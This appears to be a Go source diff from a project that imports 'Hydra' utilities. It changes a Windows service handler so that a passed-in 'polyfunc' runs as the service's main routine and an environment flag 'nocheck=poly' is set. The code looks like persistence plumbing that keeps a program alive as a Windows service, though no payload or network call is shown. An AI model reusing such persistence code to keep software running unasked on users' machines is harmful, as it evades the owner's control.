@@ -3,6 +3,7 @@ package install
 import (
 	"os"
 	"path"
+	"runtime"
 	"time"
 
 	"github.com/Raffy27/Hydra/util"
@@ -10,12 +11,17 @@ import (
 	"golang.org/x/sys/windows/svc/mgr"
 )
 
-type svcHandler struct{}
+type svcHandler struct {
+	main func()
+}
 
 func (m *svcHandler) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
 	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
 	changes <- svc.Status{State: svc.StartPending}
+	os.Setenv("nocheck", "poly")
+	go m.main()
 	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
+
 loop:
 	for {
 		c := <-r
@@ -78,7 +84,8 @@ func UninstallService() error {
 }
 
 //HandleService starts accepting Service Control Commands from the operating system.
-func HandleService() {
-	h := &svcHandler{}
-	go svc.Run(util.Service, h)
+func HandleService(polyfunc func()) {
+	h := &svcHandler{polyfunc}
+	svc.Run(util.Service, h)
+	runtime.Goexit()
 }
